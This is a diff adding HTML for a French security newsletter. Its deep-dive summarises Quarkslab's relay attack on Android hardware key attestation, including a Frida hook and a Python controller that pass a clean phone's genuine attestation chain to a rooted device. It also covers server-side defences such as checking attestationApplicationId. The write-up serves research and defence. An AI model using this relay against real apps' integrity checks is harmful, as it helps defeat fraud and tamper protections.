+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[5]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-07</span> &nbsp;&middot;&nbsp; Elastic Security Labs &mdash; <a href="https://www.elastic.co/security-labs/npm-cooldown-removal-detection-elastic-agent" style="color:#2f5474;">The security signal log tailing can't see: tracking npm cooldown removals with Elastic Agent</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[6]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-03</span> &nbsp;&middot;&nbsp; SpecterOps &mdash; <a href="https://specterops.io/blog/2026/08/03/configmanbearpig-2-0/" style="color:#2f5474;">ConfigManBearPig 2.0 - Things Are Getting Cereal</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[7]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-05-13</span> &nbsp;&middot;&nbsp; Google Project Zero &mdash; <a href="https://projectzero.google/2026/05/pixel-10-exploit.html" style="color:#2f5474;">A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens</a></td>
+      </tr>
+      <tr>
+        <td width="30" valign="top" style="width:30px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700;">[8]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-07-01</span> &nbsp;&middot;&nbsp; Paged Out! Institute &mdash; <a href="https://pagedout.institute/" style="color:#2f5474;">Paged Out! #9 et appel a articles #10</a></td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td id="partie-2" style="padding:14px 30px 0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:3px solid #1e1d1b;">
+  <tr><td style="padding:10px 0 0 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:2px; text-transform:uppercase; color:#7a4a2e; font-weight:700;">Partie 02 &nbsp;&middot;&nbsp; Deep-dive</td></tr>
+  <tr><td style="padding:4px 0 6px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:24px; line-height:29px; font-weight:700; color:#1e1d1b; letter-spacing:-0.3px;">Attestation Android : la preuve qui ne dit pas d'ou elle vient</td></tr>
+  <tr><td style="padding:0 0 14px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:14px; line-height:21px; color:#5f5c55;">Quarkslab relaie une cha&icirc;ne d'attestation mat&eacute;rielle authentique entre deux t&eacute;l&eacute;phones. Rien n'est forge, rien n'est extrait du TEE, et le backend ne voit pas la diff&eacute;rence.</td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr>
+    <td style="padding:0 0 10px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700;">Plan</td>
+  </tr>
+  <tr>
+    <td>
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">1</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Ce que l'attestation mat&eacute;rielle prouve r&eacute;ellement, et ou vivent les deux listes d'autorisations</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">2</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Le point d'appui : la cha&icirc;ne lie une cl&eacute; &agrave; un appareil sain, pas &agrave; cet appareil-ci</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">3</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">L'architecture du relais : quatre composants, un hook Frida, un t&eacute;l&eacute;phone propre</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">4</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Pourquoi le backend ne peut pas trancher, et les trois options ecartees</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 0 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">5</td></tr></table></td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Limites : attestationApplicationId, proof of possession, et ce que RKP ne change pas</td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  L'attestation de cl&eacute; Android existe depuis Android 7.0 et Keymaster 2, et elle r&eacute;pond &agrave; trois questions : la cl&eacute; priv&eacute;e vit-elle bien dans un stockage mat&eacute;riel, quelles sont ses propri&eacute;t&eacute;s, et quelles contraintes gouvernent son usage. La r&eacute;ponse prend la forme d'une cha&icirc;ne X.509 dont la feuille porte une extension &agrave; l'OID <code>1.3.6.1.4.1.11129.2.1.17</code>, sign&eacute;e par des cl&eacute;s r&eacute;sidant dans le mat&eacute;riel. La racine est la Google Hardware Attestation Root &mdash; deux racines sont actuellement publi&eacute;es, l'ancienne de num&eacute;ro de s&eacute;rie <code>f92009e853b6b045</code> et une racine EC P-384 <code>CN=Key Attestation CA 1</code> effective depuis le 1<sup>er</sup> f&eacute;vrier 2026.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le contenu de l'extension est une structure <code>KeyDescription</code>, actuellement en version 500, qui correspond &agrave; KeyMint 5.0. Deux champs portent tout le poids : <code>softwareEnforced</code> et <code>hardwareEnforced</code>. Le premier est garanti par le syst&egrave;me Android, donc par un composant qu'un attaquant qui poss&egrave;de l'OS peut manipuler ; le second est garanti par le TEE ou le StrongBox et reste hors de port&eacute;e d'un root. C'est dans <code>hardwareEnforced</code> que se trouve le <code>RootOfTrust</code>, tag <code>[704]</code>, dont les quatre champs d&eacute;crivent l'&eacute;tat de Verified Boot mesure avant qu'Android ne d&eacute;marre.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">AOSP - sch&eacute;ma d'attestation, version 500</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">KeyDescription ::= SEQUENCE {
+    attestationVersion           INTEGER,          -- 500 (KeyMint 5.0)
+    attestationSecurityLevel     SecurityLevel,    -- Software | TrustedEnvironment | StrongBox
+    keyMintVersion               INTEGER,
+    keyMintSecurityLevel         SecurityLevel,
+    attestationChallenge         OCTET_STRING,     -- le nonce du backend
+    uniqueId                     OCTET_STRING,
+    softwareEnforced             AuthorizationList,
+    hardwareEnforced             AuthorizationList,
+}
+
+RootOfTrust ::= SEQUENCE {                         -- tag [704], hardwareEnforced
+    verifiedBootKey              OCTET_STRING,
+    deviceLocked                 BOOLEAN,
+    verifiedBootState            VerifiedBootState,
+    verifiedBootHash             OCTET_STRING,
+}
+
+VerifiedBootState ::= ENUMERATED {
+    Verified (0), SelfSigned (1), Unverified (2), Failed (3),
+}</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Le nonce du backend voyage dans attestationChallenge. Le RootOfTrust est le seul endroit qui parle de l'&eacute;tat de l'appareil, et il est hardware-enforced.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Un backend correct fait ensuite une s&eacute;quence pr&eacute;cise : v&eacute;rifier les signatures jusqu'a une racine Google connue, v&eacute;rifier les dates, extraire l'extension, confirmer que <code>attestationChallenge</code> est bien le nonce qu'il a &eacute;mis, lire le <code>securityLevel</code> et le <code>RootOfTrust</code> depuis <code>hardwareEnforced</code>, et interroger la liste de r&eacute;vocation sur <code>https://android.googleapis.com/attestation/status</code>, qui renvoie un JSON index&eacute; par num&eacute;ro de s&eacute;rie avec un <code>status</code> (<code>REVOKED</code>, <code>SUSPENDED</code>) et une <code>reason</code> (<code>KEY_COMPROMISE</code>, <code>CA_COMPROMISE</code>, <code>SUPERSEDED</code>, <code>SOFTWARE_FLAW</code>). La documentation Android insiste sur un point qui devient central plus bas : ces v&eacute;rifications tournent sur le serveur. L'appareil se contente de produire la preuve.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Et c'est exactement la que se situe le probl&egrave;me que Quarkslab exploite. La cha&icirc;ne prouve qu'<em>un</em> t&eacute;l&eacute;phone en bon &eacute;tat a g&eacute;n&eacute;r&eacute; une cl&eacute; et signe un challenge. Elle ne contient aucun champ qui identifie quel appareil physique est en train de la presenter au backend, ni quel processus a demand&eacute; sa production. Le lien entre la preuve et le porteur de la preuve n'existe pas dans les octets. Pour un backend, une cha&icirc;ne relay&eacute;e et une cha&icirc;ne locale sont litt&eacute;ralement les m&ecirc;mes octets.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Ce n'est pas une formule : le certificat feuille est litt&eacute;ralement anonyme, et c'est v&eacute;rifiable champ par champ. Son <code>serialNumber</code> vaut <code>1</code> sur tous les appareils. Son sujet est <code>CN="Android Keystore Key"</code>, identique partout. Ses dates de validit&eacute; ne sont pas celles d'un appareil mais celles de la cl&eacute;, d&eacute;riv&eacute;es de <code>ACTIVE_DATETIME</code> et <code>USAGE_EXPIRE_DATETIME</code>. Le seul champ variable qui pourrait identifier quelque chose est <code>uniqueId</code>, et il est vide sauf demande explicite parce qu'il est justement consid&eacute;r&eacute; comme sensible pour la vie priv&eacute;e. L'anonymat de la cha&icirc;ne est une propri&eacute;t&eacute; voulue du design, pas un oubli &mdash; et c'est cette propri&eacute;t&eacute; que le relais consomme.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le montage tient en quatre composants. Un backend validateur (<code>attestation_backend.py</code>) qui &eacute;met un nonce sur <code>POST /nonce</code> et valide sur <code>POST /verify</code>. L'application cible, sur le t&eacute;l&eacute;phone root&eacute;, celle qu'on veut analyser. Un oracle : un second t&eacute;l&eacute;phone, non modifi&eacute;, bootloader verrouill&eacute;, qui expose un endpoint <code>/attest</code> et rend une vraie cha&icirc;ne hardware-backed pour un nonce donne. Et l'instrumentation Frida &mdash; un agent en TypeScript plus un contr&ocirc;leur Python &mdash; qui fait la navette entre les deux.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le point d'accroche dans l'application cible est la m&eacute;thode qui re&ccedil;oit le challenge et rend une cha&icirc;ne, du type <code>fun generateAttestedKey(challenge: ByteArray): AttestedKey</code>. L'agent ne modifi&eacute; pas son r&eacute;sultat : il remplace la m&eacute;thode enti&egrave;re. Le Keystore local n'est jamais sollicite, aucune API cryptographique n'est d&eacute;tourn&eacute;e, et il n'y a rien &agrave; patcher dans le boot chain.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Agent Frida - le hook (adapte de la demo Quarkslab)</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">// Agent Frida : on remplace la methode entiere, le Keystore local
+// n'est jamais appele. Forme d'apres l'agent TypeScript de Quarkslab.
+KeystoreAttestation.generateAttestedKey.implementation = function (challenge) {
+
+    // Le challenge est re-encode exactement comme l'attend le backend :
+    // NO_PADDING | NO_WRAP | URL_SAFE  ==  1 | 2 | 8
+    const nonce = Base64.encodeToString(challenge, 1 | 2 | 8);
+
+    // On sort du process : le controleur Python fera l'aller-retour
+    // vers le telephone propre, et on bloque le thread en attendant.
+    send({ event: 'attestation_request', nonce: nonce });
+    let chain = null;
+    recv('response', function (msg) { chain = msg.payload; }).wait();
+
+    // La chaine relayee est renvoyee telle quelle. Chaque signature
+    // dedans est authentique : elle vient d'un vrai TEE, sur un vrai
+    // appareil verrouille - simplement pas celui-ci.
+    return AttestedKey.$new(ArrayList.$new(chain));
+};</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Le d&eacute;tail qui compte : le re-encodage Base64 en NO_PADDING | NO_WRAP | URL_SAFE. Le nonce doit ressortir bit pour bit tel que le backend l'a &eacute;mis, sinon la comparaison de challenge &eacute;choue et le relais est detecte pour la mauvaise raison.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Contr&ocirc;leur Python - l'aller-retour vers l'oracle</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">def on_message(message, data):
+    # Le nonce vient du telephone root&eacute;, via l'agent Frida.
+    nonce = message["payload"]["nonce"]
+
+    # L'oracle : un telephone propre, bootloader verrouille, qui expose
+    # un simple POST /attest et repond avec une chaine hardware-backed.
+    response = requests.post(ORACLE_URL, json={"nonce": nonce}, timeout=10)
+    chain = response.json()["chain"]
+
+    # Renvoyee a l'agent, qui debloque le thread hook&eacute;.
+    script.post({"type": "response", "payload": chain})</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">La cha&icirc;ne revient de l'oracle d&eacute;j&agrave; dans le format attendu par le backend ; le contr&ocirc;leur ne la retouche pas.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Il faut mesurer ce que le montage ne fait pas, parce que c'est ce qui le rend int&eacute;ressant. Aucune cl&eacute; n'est extraite. Aucun keybox n'est vole. Le TEE du t&eacute;l&eacute;phone root&eacute; n'est ni contourn&eacute; ni exploit&eacute; &mdash; il n'est simplement jamais interrog&eacute;. Toutes les signatures pr&eacute;sent&eacute;es au backend sont cryptographiquement valides et proviennent d'un mat&eacute;riel authentique sur un appareil r&eacute;ellement verrouill&eacute; dont le <code>verifiedBootState</code> vaut r&eacute;ellement <code>Verified</code>. Il n'y a rien &agrave; d&eacute;tecter dans la cha&icirc;ne parce qu'il n'y a rien d'anormal dans la cha&icirc;ne.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 8px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; table-layout:fixed; border:1px solid #cfccc4;">
+  <tr>
+    <td width="22" style="width:22; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">Option</td>
+    <td width="20" style="width:20; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">Co&ucirc;t mat&eacute;riel</td>
+    <td width="24" style="width:24; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">Ce qu'on perd</td>
+    <td width="34" style="width:34; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; word-break:break-word;">Verdict de l'auteur</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Appareil propre + patch de l'app</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Un t&eacute;l&eacute;phone verrouille</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Le root, donc les moyens d'analyse</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Rejetee : l'objectif &eacute;tait justement d'analyser depuis un appareil root&eacute;</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Extraction de cl&eacute; / exploit TEE</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Fuite de keybox ou 0-day TEE</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Rien, mais les cl&eacute;s sont revocables</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Rejetee : cher, fragile, et neutralise par la status list</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Relais vers un appareil propre</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Un second t&eacute;l&eacute;phone banal</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Rien c&ocirc;t&eacute; analyse</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Retenue : bon marche, reproductible, mais ne passe qu'un gate one-shot</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Les trois voies envisagees. La troisi&egrave;me est la seule qui pr&eacute;serve le root sur l'appareil de travail, ce qui est la contrainte r&eacute;elle d'un analyste.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Les limites sont nettes et l'auteur les pose lui-m&ecirc;me. La premi&egrave;re est structurelle : le relais ne franchit qu'une <strong>validation one-shot</strong>. Si le backend demande ensuite une preuve de possession &mdash; signer un challenge frais avec la cl&eacute; attest&eacute;e &mdash; le t&eacute;l&eacute;phone root&eacute; ne peut pas r&eacute;pondre, puisque la cl&eacute; priv&eacute;e vit dans le TEE de l'appareil propre. Le montage ne meurt pas pour autant, mais il change de nature : il faut relayer chaque op&eacute;ration de signature, et le courrier one-shot devient un proxy de signature vivant, avec la latence et la fragilit&eacute; op&eacute;rationnelle que cela implique.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  La seconde limite est une ligne de code c&ocirc;t&eacute; serveur. Le champ <code>attestationApplicationId</code>, tag <code>[709]</code>, contient le nom de package et les empreintes SHA-256 des certificats de signature de l'application qui a demand&eacute; l'attestation. Le backend de la demo ne le v&eacute;rifie pas &mdash; Quarkslab le dit explicitement, le gate a &eacute;t&eacute; laiss&eacute; ouvert pour que le relais ait quelque chose &agrave; franchir. Ajouter la comparaison suffit &agrave; rejeter une cha&icirc;ne produite par une autre application.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Ce champ vit dans <code>softwareEnforced</code>, donc garanti par la plateforme et non par le TEE, et cela dicte l'ordre des v&eacute;rifications : il ne devient digne de confiance qu'apr&egrave;s avoir valide, dans <code>hardwareEnforced</code>, que <code>deviceLocked</code> est vrai et que <code>verifiedBootState</code> vaut <code>Verified</code>. Sur un appareil verrouill&eacute;, la plateforme est dans l'&eacute;tat que le RootOfTrust d&eacute;crit ; sur un appareil dont le bootloader est ouvert, <code>softwareEnforced</code> ne vaut rien. V&eacute;rifier le tag [709] en premier serait une erreur de raisonnement, pas seulement d'ordre.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 20px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f7ecd6; border:2px dashed #8a5a12;">
+  <tr>
+    <td style="padding:12px 16px 6px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:1.5px; text-transform:uppercase; font-weight:700; color:#6b4409;">&#9888;&#65039; Hypoth&egrave;se non test&eacute;e</td>
+  </tr>
+  <tr>
+    <td style="padding:0 16px 14px 16px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:23px; color:#3b2c11;">La proof of possession est pr&eacute;sent&eacute;e par Quarkslab comme une <em>proposition de conception, raisonn&eacute;e mais ni impl&eacute;ment&eacute;e ni test&eacute;e</em> dans le travail publi&eacute;. Le contr&ocirc;le d'<code>attestationApplicationId</code>, lui, a bien &eacute;t&eacute; test&eacute; contre le relais d&eacute;crit et le rejette. La diff&eacute;rence de statut entre les deux d&eacute;fenses est explicite dans le post et n'est pas une nuance : la premi&egrave;re s'appuie par analogie sur le sch&eacute;ma attestation-puis-assertion des authentificateurs FIDO, ce qui est un argument, pas une mesure.</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Restent les pr&eacute;requis, qui sont la vraie friction. Il faut deux appareils physiques &mdash; les &eacute;mulateurs ne produisent pas d'attestation mat&eacute;rielle &mdash;, un frida-server sur la machine d'analyse, un appareil propre &agrave; port&eacute;e r&eacute;seau, et de quoi piloter l'application cible sur cet appareil propre pour produire une attestation issue du bon package si le backend v&eacute;rifie le tag [709]. Ce dernier point est ce qui rend la d&eacute;fense &agrave; une ligne s&eacute;rieuse : piloter l'application sur un t&eacute;l&eacute;phone non instrument&eacute; est pr&eacute;cis&eacute;ment ce qu'on ne sait pas bien faire quand on a renonc&eacute; au root.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Quant &agrave; Remote Key Provisioning, il d&eacute;place le probl&egrave;me sans le r&eacute;soudre. RKP fait partie d'AOSP depuis Android 12 et a &eacute;t&eacute; r&eacute;empaquet&eacute; en module APEX dans Android 14 ; il remplace la cl&eacute; d'attestation unique partagee par un lot d'appareils, dont la fuite compromet tout le lot jusqu'a r&eacute;vocation, par des certificats courts et propres &agrave; chaque appareil, ce qui rend la r&eacute;vocation unitaire possible. C'est une am&eacute;lioration r&eacute;elle contre le vol de keybox &mdash; l'option num&eacute;ro deux du tableau. Elle ne fait rien contre le relais, parce que le relais n'utilise aucune cl&eacute; volee : il fait produire une attestation l&eacute;gitime par un appareil l&eacute;gitime. Un certificat par appareil, plus court, plus r&eacute;vocable, reste indistinguable une fois relay&eacute;.
+</td>
+</tr>
+<tr>
